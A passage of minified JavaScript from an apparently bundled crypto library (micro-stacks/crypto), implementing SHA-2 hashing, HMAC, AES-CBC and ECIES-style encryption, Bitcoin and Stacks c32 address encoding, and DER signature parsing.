            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          Bt = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          Pt = new Uint32Array(64);
        class _t extends ft {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | Bt[0]),
              (this.B = 0 | Bt[1]),
              (this.C = 0 | Bt[2]),
              (this.D = 0 | Bt[3]),
              (this.E = 0 | Bt[4]),
              (this.F = 0 | Bt[5]),
              (this.G = 0 | Bt[6]),
              (this.H = 0 | Bt[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let u = 0; u < 16; u++, t += 4) Pt[u] = e.getUint32(t, !1);
            for (let u = 16; u < 64; u++) {
              const e = Pt[u - 15],
                t = Pt[u - 2],
                n = st(e, 7) ^ st(e, 18) ^ (e >>> 3),
                r = st(t, 17) ^ st(t, 19) ^ (t >>> 10);
              Pt[u] = (r + Pt[u - 7] + n + Pt[u - 16]) | 0;
            }
            let { A: n, B: r, C: i, D: o, E: s, F: a, G: l, H: c } = this;
            for (let u = 0; u < 64; u++) {
              const e =
                  (c +
                    (st(s, 6) ^ st(s, 11) ^ st(s, 25)) +
                    Ct(s, a, l) +
                    Ot[u] +
                    Pt[u]) |
                  0,
                t = ((st(n, 2) ^ st(n, 13) ^ st(n, 22)) + It(n, r, i)) | 0;
              (c = l),
                (l = a),
                (a = s),
                (s = (o + e) | 0),
                (o = i),
                (i = r),
                (r = n),
                (n = (e + t) | 0);
            }
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (i = (i + this.C) | 0),
              (o = (o + this.D) | 0),
              (s = (s + this.E) | 0),
              (a = (a + this.F) | 0),
              (l = (l + this.G) | 0),
              (c = (c + this.H) | 0),
              this.set(n, r, i, o, s, a, l, c);
          }
          roundClean() {
            Pt.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        const Ut = ut(() => new _t()),
          Nt = BigInt(2 ** 32 - 1),
          Rt = BigInt(32);
        function Lt(e) {
          return arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
            ? { h: Number(e & Nt), l: Number((e >> Rt) & Nt) }
            : { h: 0 | Number((e >> Rt) & Nt), l: 0 | Number(e & Nt) };
        }
        const $t = {
            fromBig: Lt,
            split: function (e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n = new Uint32Array(e.length),
                r = new Uint32Array(e.length);
              for (let i = 0; i < e.length; i++) {
                const { h: o, l: s } = Lt(e[i], t);
                [n[i], r[i]] = [o, s];
              }
              return [n, r];
            },
            toBig: (e, t) => (BigInt(e >>> 0) << Rt) | BigInt(t >>> 0),
            shrSH: (e, t, n) => e >>> n,
            shrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrSH: (e, t, n) => (e >>> n) | (t << (32 - n)),
            rotrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrBH: (e, t, n) => (e << (64 - n)) | (t >>> (n - 32)),
            rotrBL: (e, t, n) => (e >>> (n - 32)) | (t << (64 - n)),
            rotr32H: (e, t) => t,
            rotr32L: (e, t) => e,
            rotlSH: (e, t, n) => (e << n) | (t >>> (32 - n)),
            rotlSL: (e, t, n) => (t << n) | (e >>> (32 - n)),
            rotlBH: (e, t, n) => (t << (n - 32)) | (e >>> (64 - n)),
            rotlBL: (e, t, n) => (e << (n - 32)) | (t >>> (64 - n)),
            add: function (e, t, n, r) {
              const i = (t >>> 0) + (r >>> 0);
              return { h: (e + n + ((i / 2 ** 32) | 0)) | 0, l: 0 | i };
            },
            add3L: (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
            add3H: (e, t, n, r) => (t + n + r + ((e / 2 ** 32) | 0)) | 0,
            add4L: (e, t, n, r) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
            add4H: (e, t, n, r, i) => (t + n + r + i + ((e / 2 ** 32) | 0)) | 0,
            add5H: (e, t, n, r, i, o) =>
              (t + n + r + i + o + ((e / 2 ** 32) | 0)) | 0,
            add5L: (e, t, n, r, i) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (i >>> 0),
          },
          Ht = $t,
          [Dt, Mt] = Ht.split(
            [
              "0x428a2f98d728ae22",
              "0x7137449123ef65cd",
              "0xb5c0fbcfec4d3b2f",
              "0xe9b5dba58189dbbc",
              "0x3956c25bf348b538",
              "0x59f111f1b605d019",
              "0x923f82a4af194f9b",
              "0xab1c5ed5da6d8118",
              "0xd807aa98a3030242",
              "0x12835b0145706fbe",
              "0x243185be4ee4b28c",
              "0x550c7dc3d5ffb4e2",
              "0x72be5d74f27b896f",
              "0x80deb1fe3b1696b1",
              "0x9bdc06a725c71235",
              "0xc19bf174cf692694",
              "0xe49b69c19ef14ad2",
              "0xefbe4786384f25e3",
              "0x0fc19dc68b8cd5b5",
              "0x240ca1cc77ac9c65",
              "0x2de92c6f592b0275",
              "0x4a7484aa6ea6e483",
              "0x5cb0a9dcbd41fbd4",
              "0x76f988da831153b5",
              "0x983e5152ee66dfab",
              "0xa831c66d2db43210",
              "0xb00327c898fb213f",
              "0xbf597fc7beef0ee4",
              "0xc6e00bf33da88fc2",
              "0xd5a79147930aa725",
              "0x06ca6351e003826f",
              "0x142929670a0e6e70",
              "0x27b70a8546d22ffc",
              "0x2e1b21385c26c926",
              "0x4d2c6dfc5ac42aed",
              "0x53380d139d95b3df",
              "0x650a73548baf63de",
              "0x766a0abb3c77b2a8",
              "0x81c2c92e47edaee6",
              "0x92722c851482353b",
              "0xa2bfe8a14cf10364",
              "0xa81a664bbc423001",
              "0xc24b8b70d0f89791",
              "0xc76c51a30654be30",
              "0xd192e819d6ef5218",
              "0xd69906245565a910",
              "0xf40e35855771202a",
              "0x106aa07032bbd1b8",
              "0x19a4c116b8d2d0c8",
              "0x1e376c085141ab53",
              "0x2748774cdf8eeb99",
              "0x34b0bcb5e19b48a8",
              "0x391c0cb3c5c95a63",
              "0x4ed8aa4ae3418acb",
              "0x5b9cca4f7763e373",
              "0x682e6ff3d6b2b8a3",
              "0x748f82ee5defb2fc",
              "0x78a5636f43172f60",
              "0x84c87814a1f0ab72",
              "0x8cc702081a6439ec",
              "0x90befffa23631e28",
              "0xa4506cebde82bde9",
              "0xbef9a3f7b2c67915",
              "0xc67178f2e372532b",
              "0xca273eceea26619c",
              "0xd186b8c721c0c207",
              "0xeada7dd6cde0eb1e",
              "0xf57d4f7fee6ed178",
              "0x06f067aa72176fba",
              "0x0a637dc5a2c898a6",
              "0x113f9804bef90dae",
              "0x1b710b35131c471b",
              "0x28db77f523047d84",
              "0x32caab7b40c72493",
              "0x3c9ebe0a15c9bebc",
              "0x431d67c49c100d4c",
              "0x4cc5d4becb3e42b6",
              "0x597f299cfc657e2a",
              "0x5fcb6fab3ad6faec",
              "0x6c44198c4a475817",
            ].map((e) => BigInt(e))
          ),
          Ft = new Uint32Array(80),
          jt = new Uint32Array(80);
        class zt extends ft {
          constructor() {
            super(128, 64, 16, !1),
              (this.Ah = 1779033703),
              (this.Al = -205731576),
              (this.Bh = -1150833019),
              (this.Bl = -2067093701),
              (this.Ch = 1013904242),
              (this.Cl = -23791573),
              (this.Dh = -1521486534),
              (this.Dl = 1595750129),
              (this.Eh = 1359893119),
              (this.El = -1377402159),
              (this.Fh = -1694144372),
              (this.Fl = 725511199),
              (this.Gh = 528734635),
              (this.Gl = -79577749),
              (this.Hh = 1541459225),
              (this.Hl = 327033209);
          }
          get() {
            const {
              Ah: e,
              Al: t,
              Bh: n,
              Bl: r,
              Ch: i,
              Cl: o,
              Dh: s,
              Dl: a,
              Eh: l,
              El: c,
              Fh: u,
              Fl: f,
              Gh: h,
              Gl: d,
              Hh: p,
              Hl: g,
            } = this;
            return [e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g];
          }
          set(e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g) {
            (this.Ah = 0 | e),
              (this.Al = 0 | t),
              (this.Bh = 0 | n),
              (this.Bl = 0 | r),
              (this.Ch = 0 | i),
              (this.Cl = 0 | o),
              (this.Dh = 0 | s),
              (this.Dl = 0 | a),
              (this.Eh = 0 | l),
              (this.El = 0 | c),
              (this.Fh = 0 | u),
              (this.Fl = 0 | f),
              (this.Gh = 0 | h),
              (this.Gl = 0 | d),
              (this.Hh = 0 | p),
              (this.Hl = 0 | g);
          }
          process(e, t) {
            for (let m = 0; m < 16; m++, t += 4)
              (Ft[m] = e.getUint32(t)), (jt[m] = e.getUint32((t += 4)));
            for (let m = 16; m < 80; m++) {
              const e = 0 | Ft[m - 15],
                t = 0 | jt[m - 15],
                n = Ht.rotrSH(e, t, 1) ^ Ht.rotrSH(e, t, 8) ^ Ht.shrSH(e, t, 7),
                r = Ht.rotrSL(e, t, 1) ^ Ht.rotrSL(e, t, 8) ^ Ht.shrSL(e, t, 7),
                i = 0 | Ft[m - 2],
                o = 0 | jt[m - 2],
                s =
                  Ht.rotrSH(i, o, 19) ^ Ht.rotrBH(i, o, 61) ^ Ht.shrSH(i, o, 6),
                a =
                  Ht.rotrSL(i, o, 19) ^ Ht.rotrBL(i, o, 61) ^ Ht.shrSL(i, o, 6),
                l = Ht.add4L(r, a, jt[m - 7], jt[m - 16]),
                c = Ht.add4H(l, n, s, Ft[m - 7], Ft[m - 16]);
              (Ft[m] = 0 | c), (jt[m] = 0 | l);
            }
            let {
              Ah: n,
              Al: r,
              Bh: i,
              Bl: o,
              Ch: s,
              Cl: a,
              Dh: l,
              Dl: c,
              Eh: u,
              El: f,
              Fh: h,
              Fl: d,
              Gh: p,
              Gl: g,
              Hh: y,
              Hl: w,
            } = this;
            for (let m = 0; m < 80; m++) {
              const e =
                  Ht.rotrSH(u, f, 14) ^
                  Ht.rotrSH(u, f, 18) ^
                  Ht.rotrBH(u, f, 41),
                t =
                  Ht.rotrSL(u, f, 14) ^
                  Ht.rotrSL(u, f, 18) ^
                  Ht.rotrBL(u, f, 41),
                b = (u & h) ^ (~u & p),
                v = (f & d) ^ (~f & g),
                E = Ht.add5L(w, t, v, Mt[m], jt[m]),
                S = Ht.add5H(E, y, e, b, Dt[m], Ft[m]),
                x = 0 | E,
                A =
                  Ht.rotrSH(n, r, 28) ^
                  Ht.rotrBH(n, r, 34) ^
                  Ht.rotrBH(n, r, 39),
                k =
                  Ht.rotrSL(n, r, 28) ^
                  Ht.rotrBL(n, r, 34) ^
                  Ht.rotrBL(n, r, 39),
                T = (n & i) ^ (n & s) ^ (i & s),
                C = (r & o) ^ (r & a) ^ (o & a);
              (y = 0 | p),
                (w = 0 | g),
                (p = 0 | h),
                (g = 0 | d),
                (h = 0 | u),
                (d = 0 | f),
                ({ h: u, l: f } = Ht.add(0 | l, 0 | c, 0 | S, 0 | x)),
                (l = 0 | s),
                (c = 0 | a),
                (s = 0 | i),
                (a = 0 | o),
                (i = 0 | n),
                (o = 0 | r);
              const I = Ht.add3L(x, k, C);
              (n = Ht.add3H(I, S, A, T)), (r = 0 | I);
            }
            ({ h: n, l: r } = Ht.add(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)),
              ({ h: i, l: o } = Ht.add(0 | this.Bh, 0 | this.Bl, 0 | i, 0 | o)),
              ({ h: s, l: a } = Ht.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
              ({ h: l, l: c } = Ht.add(0 | this.Dh, 0 | this.Dl, 0 | l, 0 | c)),
              ({ h: u, l: f } = Ht.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | f)),
              ({ h: h, l: d } = Ht.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | d)),
              ({ h: p, l: g } = Ht.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
              ({ h: y, l: w } = Ht.add(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | w)),
              this.set(n, r, i, o, s, a, l, c, u, f, h, d, p, g, y, w);
          }
          roundClean() {
            Ft.fill(0), jt.fill(0);
          }
          destroy() {
            this.buffer.fill(0),
              this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
          }
        }
        class Kt extends zt {
          constructor() {
            super(),
              (this.Ah = 573645204),
              (this.Al = -64227540),
              (this.Bh = -1621794909),
              (this.Bl = -934517566),
              (this.Ch = 596883563),
              (this.Cl = 1867755857),
              (this.Dh = -1774684391),
              (this.Dl = 1497426621),
              (this.Eh = -1775747358),
              (this.El = -1467023389),
              (this.Fh = -1101128155),
              (this.Fl = 1401305490),
              (this.Gh = 721525244),
              (this.Gl = 746961066),
              (this.Hh = 246885852),
              (this.Hl = -2117784414),
              (this.outputLen = 32);
          }
        }
        class Wt extends zt {
          constructor() {
            super(),
              (this.Ah = -876896931),
              (this.Al = -1056596264),
              (this.Bh = 1654270250),
              (this.Bl = 914150663),
              (this.Ch = -1856437926),
              (this.Cl = 812702999),
              (this.Dh = 355462360),
              (this.Dl = -150054599),
              (this.Eh = 1731405415),
              (this.El = -4191439),
              (this.Fh = -1900787065),
              (this.Fl = 1750603025),
              (this.Gh = -619958771),
              (this.Gl = 1694076839),
              (this.Hh = 1203062813),
              (this.Hl = -1090891868),
              (this.outputLen = 48);
          }
        }
        const Vt = ut(() => new zt());
        ut(() => new Kt()), ut(() => new Wt());
        function qt(e) {
          return Ut.create().update(f(e)).digest();
        }
        var Gt = ((e) =>
            typeof require < "u"
              ? require
              : typeof Proxy < "u"
              ? new Proxy(e, {
                  get: (e, t) => (typeof require < "u" ? require : e)[t],
                })
              : e)(function (e) {
            if (typeof require < "u") return require.apply(this, arguments);
            throw new Error('Dynamic require of "' + e + '" is not supported');
          }),
          Yt = class {
            constructor(e) {
              a(this, "webCrypto", void 0), (this.webCrypto = e);
            }
            async encrypt(e, t, n, r) {
              let i, o;
              if ("aes-128-cbc" === e) (i = "AES-CBC"), (o = 128);
              else {
                if ("aes-256-cbc" !== e)
                  throw new Error(`Unsupported cipher algorithm "${e}"`);
                (i = "AES-CBC"), (o = 256);
              }
              let s = await this.webCrypto.subtle.importKey(
                  "raw",
                  t,
                  { name: i, length: o },
                  !1,
                  ["encrypt"]
                ),
                a = await this.webCrypto.subtle.encrypt(
                  { name: i, iv: n },
                  s,
                  r
                );
              return new Uint8Array(a);
            }
            async decrypt(e, t, n, r) {
              let i, o;
              if ("aes-128-cbc" === e) (i = "AES-CBC"), (o = 128);
              else {
                if ("aes-256-cbc" !== e)
                  throw new Error(`Unsupported cipher algorithm "${e}"`);
                (i = "AES-CBC"), (o = 256);
              }
              let s = await this.webCrypto.subtle.importKey(
                  "raw",
                  t,
                  { name: i, length: o },
                  !1,
                  ["decrypt"]
                ),
                a = await this.webCrypto.subtle.decrypt(
                  { name: i, iv: n },
                  s,
                  r
                );
              return new Uint8Array(a);
            }
          },
          Zt = class {
            constructor(e, t) {
              a(this, "createCipher", void 0),
                a(this, "createDecipher", void 0),
                (this.createCipher = e),
                (this.createDecipher = t);
            }
            async encrypt(e, t, n, r) {
              if ("aes-128-cbc" !== e && "aes-256-cbc" !== e)
                throw new Error(`Unsupported cipher algorithm "${e}"`);
              let i = this.createCipher(e, t, n),
                o = u([i.update(r), i.final()]);
              return Promise.resolve(o);
            }
            async decrypt(e, t, n, r) {
              if ("aes-128-cbc" !== e && "aes-256-cbc" !== e)
                throw new Error(`Unsupported cipher algorithm "${e}"`);
              let i = this.createDecipher(e, t, n),
                o = u([i.update(r), i.final()]);
              return Promise.resolve(o);
            }
          };
        var Jt =
          'Crypto lib not found. Either the WebCrypto "crypto.subtle" or Node.js "crypto" module must be available.';
        async function Xt() {
          if (typeof crypto < "u" && typeof crypto.subtle < "u")
            return { lib: crypto, name: "webCrypto" };
          try {
            return { lib: Gt("crypto"), name: "nodeCrypto" };
          } catch {
            throw new Error(Jt);
          }
        }
        async function Qt() {
          let e = await Xt();
          return "webCrypto" === e.name
            ? new Yt(e.lib)
            : new Zt(e.lib.createCipheriv, e.lib.createDecipheriv);
        }
        async function en(e, t, n) {
          return (await Qt()).encrypt("aes-256-cbc", t, e, n);
        }
        async function tn(e, t, n) {
          return (await Qt()).decrypt("aes-256-cbc", t, e, n);
        }
        class nn extends ct {
          constructor(e, t) {
            super(), (this.finished = !1), (this.destroyed = !1), it.hash(e);
            const n = lt(t);
            if (((this.iHash = e.create()), !(this.iHash instanceof ct)))
              throw new TypeError(
                "Expected instance of class which extends utils.Hash"
              );
            const r = (this.blockLen = this.iHash.blockLen);
            this.outputLen = this.iHash.outputLen;
            const i = new Uint8Array(r);
            i.set(
              n.length > this.iHash.blockLen ? e.create().update(n).digest() : n
            );
            for (let o = 0; o < i.length; o++) i[o] ^= 54;
            this.iHash.update(i), (this.oHash = e.create());
            for (let o = 0; o < i.length; o++) i[o] ^= 106;
            this.oHash.update(i), i.fill(0);
          }
          update(e) {
            return it.exists(this), this.iHash.update(e), this;
          }
          digestInto(e) {
            it.exists(this),
              it.bytes(e, this.outputLen),
              (this.finished = !0),
              this.iHash.digestInto(e),
              this.oHash.update(e),
              this.oHash.digestInto(e),
              this.destroy();
          }
          digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e), e;
          }
          _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {
              oHash: t,
              iHash: n,
              finished: r,
              destroyed: i,
              blockLen: o,
              outputLen: s,
            } = this;
            return (
              (e.finished = r),
              (e.destroyed = i),
              (e.blockLen = o),
              (e.outputLen = s),
              (e.oHash = t._cloneInto(e.oHash)),
              (e.iHash = n._cloneInto(e.iHash)),
              e
            );
          }
          destroy() {
            (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
          }
        }
        const rn = (e, t, n) => new nn(e, t).update(n).digest();
        function on(e) {
          let t = rn.create(Ut, f(e));
          for (
            var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1;
            i < n;
            i++
          )
            r[i - 1] = arguments[i];
          for (let o of r) t.update(f(o));
          return Uint8Array.from(t.digest());
        }
        function sn(e) {
          let t,
            { payloadShell: n, payloadValuesLength: r } = (function (e) {
              let t = {
                iv: "",
                ephemeralPK: "",
                mac: "",
                cipherText: "",
                wasString: !!e.wasString,
              };
              return (
                "base64" === e.cipherTextEncoding &&
                  (t.cipherTextEncoding = "base64"),
                { payloadValuesLength: 162, payloadShell: JSON.stringify(t) }
              );
            })(e),
            i = (function (e) {
              return 16 * (Math.floor(e / 16) + 1);
            })(e.contentLength);
          if (e.cipherTextEncoding && "hex" !== e.cipherTextEncoding) {
            if ("base64" !== e.cipherTextEncoding)
              throw new Error(
                `Unexpected cipherTextEncoding "${e.cipherTextEncoding}"`
              );
            t = (function (e) {
              return 4 * Math.ceil(e / 3);
            })(i);
          } else t = 2 * i;
          if (e.sign) {
            let { signedPayloadShell: e, signedPayloadValuesLength: i } =
              (function (e) {
                let t = { signature: "", publicKey: "", cipherText: e };
                return {
                  signedPayloadValuesLength: 210,
                  signedPayloadShell: JSON.stringify(t),
                };
              })(n);
            return e.length + i + r + t;
          }
          return n.length + r + t;
        }
        rn.create = (e, t) => new nn(e, t);
        var an = class {
          digest(e) {
            return "string" == typeof (t = e)
              ? Tt(t)
              : Tt.create().update(f(t)).digest();
            var t;
          }
        };
        function ln(e) {
          return new an().digest(e);
        }
        function cn(e) {
          let t = ((n = e), Vt.create().update(f(n)).digest());
          var n;
          return { encryptionKey: t.slice(0, 32), hmacKey: t.slice(32) };
        }
        function un() {
          let e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
          return et.randomBytes(e);
        }
        function fn(e, t) {
          let n = new Uint8Array([t]),
            r = new Uint8Array(25),
            i = new Uint8Array(21);
          (i[0] = t), i.set(e, 1);
          let o = qt(i),
            s = qt(o).slice(0, 4);
          return (
            r.set(n, 0),
            r.set(e, 1),
            r.set(s, e.length + 1),
            (function (e) {
              if (0 === e.length) return "";
              "string" == typeof e &&
                (e =
                  typeof TextEncoder < "u"
                    ? new TextEncoder().encode(e)
                    : new Uint8Array(e.split("").map((e) => e.charCodeAt(0))));
              let t = BigInt("0x" + g(e)),
                n = [];
              for (; t > 0; ) {
                let e = Number(t % j);
                (t /= j), n.push(F[e]);
              }
              for (let r = 0; 0 === e[r]; r++) n.push(F[0]);
              return n.reverse().join("");
            })(r)
          );
        }
        var hn,
          dn = {
            bitcoin: {
              messagePrefix: "\x18Bitcoin Signed Message:\n",
              bech32: "bc",
              bip32: { public: 76067358, private: 76066276 },
              pubKeyHash: 0,
              scriptHash: 5,
              wif: 128,
            },
            testnet: {
              messagePrefix: "\x18Bitcoin Signed Message:\n",
              bech32: "tb",
              bip32: { public: 70617039, private: 70615956 },
              pubKeyHash: 111,
              scriptHash: 196,
              wif: 239,
            },
          },
          pn =
            (((hn = pn || {})[(hn.mainnetP2PKH = 22)] = "mainnetP2PKH"),
            (hn[(hn.mainnetP2SH = 20)] = "mainnetP2SH"),
            (hn[(hn.testnetP2PKH = 26)] = "testnetP2PKH"),
            (hn[(hn.testnetP2SH = 21)] = "testnetP2SH"),
            hn),
          gn = "0123456789ABCDEFGHJKMNPQRSTVWXYZ",
          yn = new Map();
        [...gn].forEach((e, t) => yn.set(e, t));
        var wn = "0123456789abcdef",
          mn = new Map();
        function bn(e, t) {
          let n = (function (e) {
            let t = g(e),
              n = [],
              r = 0;
            for (let a = t.length - 1; a >= 0; a--)
              if (r < 4) {
                let e = mn.get(t[a]) >> r,
                  i = 0;
                0 !== a && (i = mn.get(t[a - 1]));
                let o = 1 + r,
                  s = gn[e + (i % (1 << o) << (5 - o))];
                (r = o), n.unshift(s);
              } else r = 0;
            let i = 0;
            for (let a = 0; a < n.length && "0" === n[a]; a++) i++;
            n = n.slice(i);
            let o = /^\u0000*/.exec(new TextDecoder().decode(e)),
              s = o ? o[0].length : 0;
            for (let a = 0; a < s; a++) n.unshift(gn[0]);
            return n.join("");
          })(u([t, vn(e, t)]));
          return `S${gn[e]}${n}`;
        }
        function vn(e, t) {
          let n = qt(u([Uint8Array.of(e), t]));
          return qt(n).slice(0, 4);
        }
        function En(e) {
          if (e.length <= 5)
            throw new Error("Invalid c32 address: invalid length");
          if ("S" !== e[0])
            throw new Error('Invalid c32 address: must start with "S"');
          return (function (e) {
            e = Sn(e);
            let t = (function (e) {
                if (((e = Sn(e)), !RegExp(`^[${gn}]*$`).exec(e)))
                  throw new Error("Not a c32-encoded string");
                let t = RegExp(`^${gn[0]}*`).exec(e),
                  n = t ? t[0].length : 0,
                  r = [],
                  i = 0,
                  o = 0;
                for (let l = e.length - 1; l >= 0; l--) {
                  4 === o && (r.unshift(wn[i]), (o = 0), (i = 0));
                  let t = (yn.get(e[l]) << o) + i,
                    n = wn[t % 16];
                  if (((o += 1), (i = t >> 4), i > 1 << o))
                    throw new Error("Panic error in decoding.");
                  r.unshift(n);
                }
                r.unshift(wn[i]), r.length % 2 === 1 && r.unshift("0");
                let s = 0;
                for (let l = 0; l < r.length && "0" === r[l]; l++) s++;
                r = r.slice(s - (s % 2));
                let a = r.join("");
                for (let l = 0; l < n; l++) a = `00${a}`;
                return p(a);
              })(e.slice(1)),
              n = e[0],
              r = yn.get(n),
              i = t.slice(-4),
              o = vn(r, t.slice(0, -4));
            for (let s = 0; s < i.length; s++)
              if (i[s] !== o[s])
                throw new Error("Invalid c32check string: checksum mismatch");
            return [r, t.slice(0, -4)];
          })(e.slice(1));
        }
        function Sn(e) {
          return e.toUpperCase().replace(/O/g, "0").replace(/L|I/g, "1");
        }
        function xn(e) {
          try {
            return En(e), !0;
          } catch {
            return !1;
          }
        }
        function An(e) {
          return bn(
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 22,
            Cn(b(e))
          );
        }
        function kn(e) {
          return fn(ln(qt(Fe(e, !0))), dn.bitcoin.pubKeyHash);
        }
        function Tn(e) {
          return fn(
            ln(qt(p("string" == typeof e ? e : g(e)))),
            dn.bitcoin.pubKeyHash
          );
        }
        function Cn(e) {
          return ln(qt(e));
        }
        [...wn].forEach((e, t) => mn.set(e, t));
        async function In(e) {
          let { contents: t, privateKey: n } = e,
            r =
              t instanceof ArrayBuffer ? l(t) : "string" == typeof t ? h(t) : t,
            i = g(Fe(n, !0)),
            o = qt(r);
          return {
            signature: g(await Ye(o, n, { canonical: !1 })),
            publicKey: i,
          };
        }
        function On(e) {
          let t =
              arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
            { contents: n, publicKey: r, signature: i } = e;
          return Je(
            i,
            qt(
              n instanceof ArrayBuffer ? l(n) : "string" == typeof n ? h(n) : n
            ),
            r,
            { strict: t }
          );
        }
        async function Bn(e) {
          let { privateKey: t, cipherObject: n } = e;
          if (!n.ephemeralPK)
            throw Error("No ephemeralPK found in cipher object");
          let r = n.ephemeralPK,
            i = ze(t, r, !0);
          i = i.slice(1);
          let o,
            s = cn(i),
            a = p(n.iv);
          if (n.cipherTextEncoding && "hex" !== n.cipherTextEncoding) {
            if ("base64" !== n.cipherTextEncoding)
              throw new Error(
                `Unexpected cipherTextEncoding "${n.cipherText}"`
              );
            o = U(n.cipherText);
          } else o = p(n.cipherText);
          let l = u([a, p(r), o]),
            c = on(s.hmacKey, l);
          if (
            !(function (e, t) {
              if (e.length !== t.length) return !1;
              let n = 0;
              for (let r = 0; r < e.length; r++) n |= e[r] ^ t[r];
              return 0 === n;
            })(p(n.mac), c)
          )
            throw new Error("Decryption failed: failure in MAC check");
          let f = await tn(a, s.encryptionKey, o);
          return n.wasString ? new TextDecoder().decode(f) : f;
        }
        function Pn(e, t) {
          if (!t.privateKey)
            throw new Error("Private key is required for decryption.");
          try {
            let n = JSON.parse(e);
            return Bn({ privateKey: t.privateKey, cipherObject: n });
          } catch (hr) {
            throw hr instanceof SyntaxError
              ? new Error(
                  "Failed to parse encrypted content JSON. The content may not be encrypted. If using getFile, try passing { decrypt: false }."
                )
              : hr;
          }
        }
        async function _n(e, t) {
          let { publicKey: n, privateKey: r, wasString: i } = t,
            { cipherTextEncoding: o, sign: s } = t;
          if (!r && !n)
            throw new Error(
              "Either public key or private key must be supplied for encryption."
            );
          if (
            (!n && r && (n = g(Fe(r, !0))),
            "boolean" != typeof i && (i = "string" == typeof e),
            !n)
          )
            throw new Error(
              "micro-stacks/crypto - no public key found to encrypt content"
            );
          let a = "string" == typeof e ? h(e) : e,
            l = await (async function (e) {
              let {
                  publicKey: t,
                  content: n,
                  cipherTextEncoding: r = "hex",
                  wasString: i,
                } = e,
                o = et.randomPrivateKey(),
                s = Fe(o, !0),
                a = ze(o, t, !0);
              a = a.slice(1);
              let l,
                c = cn(a),
                f = un(16),
                h = await en(f, c.encryptionKey, n),
                d = u([f, s, h]),
                p = on(c.hmacKey, d);
              if (r && "hex" !== r) {
                if ("base64" !== r)
                  throw new Error(`Unexpected cipherTextEncoding "${r}"`);
                l = D(h);
              } else l = g(h);
              let y = {
                iv: g(f),
                ephemeralPK: g(s),
                cipherText: l,
                mac: g(p),
                wasString: i,
              };
              return r && "hex" !== r && (y.cipherTextEncoding = r), y;
            })({
              publicKey: n,
              content: a,
              wasString: i,
              cipherTextEncoding: o,
            });
          if (!s) return JSON.stringify(l);
          if (("string" == typeof s && (r = s), !r))
            throw new Error(
              "micro-stacks/crypto - need private key to sign contents"
            );
          let c = await In({ contents: JSON.stringify(l), privateKey: r });
          return JSON.stringify({ ...c, cipherText: JSON.stringify(l) });
        }
        function Un(e) {
          return e.replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
        }
        var Nn = {
            encode: function (e) {
              return e instanceof Uint8Array
                ? Un(D(e))
                : Un(D(new TextEncoder().encode(e)));
            },
            decode: function (e) {
              let t = U(
                (function (e) {
                  let t;
                  return (
                    (t =
                      e instanceof Uint8Array
                        ? new TextDecoder().decode(e)
                        : e),
                    (function (e) {
                      let t = e.length,
                        n = t % 4;
                      if (!n) return e;
                      let r = t + (4 - n);
                      return e.padEnd(r, "=");
                    })(t)
                      .replace(/\-/g, "+")
                      .replace(/_/g, "/")
                  );
                })(e)
              );
              return new TextDecoder().decode(t);
            },
          },
          Rn = 128;
        function Ln(e) {
          return "string" == typeof e ? U(e) : e;
        }
        function $n(e) {
          let t = Ln(e),
            n = t.length,
            r = 0;
          if (48 !== t[r++]) throw new Error('Could not find expected "seq"');
          let i = t[r++];
          if ((i === (1 | Rn) && (i = t[r++]), n - r < i))
            throw new Error(
              '"seq" specified length of "' +
                i +
                '", only "' +
                (n - r) +
                '" remaining'
            );
          if (2 !== t[r++])
            throw new Error('Could not find expected "int" for "r"');
          let o = t[r++];
          if (n - r - 2 < o)
            throw new Error(
              '"r" specified length of "' +
                o +
                '", only "' +
                (n - r - 2) +
                '" available'
            );
          if (33 < o)
            throw new Error(
              '"r" specified length of "' + o + '", max of "33" is acceptable'
            );
          let s = r;
          if (((r += o), 2 !== t[r++]))
            throw new Error('Could not find expected "int" for "s"');
          let a = t[r++];
          if (n - r !== a)
            throw new Error(
              '"s" specified length of "' + a + '", expected "' + (n - r) + '"'
            );
          if (33 < a)
            throw new Error(
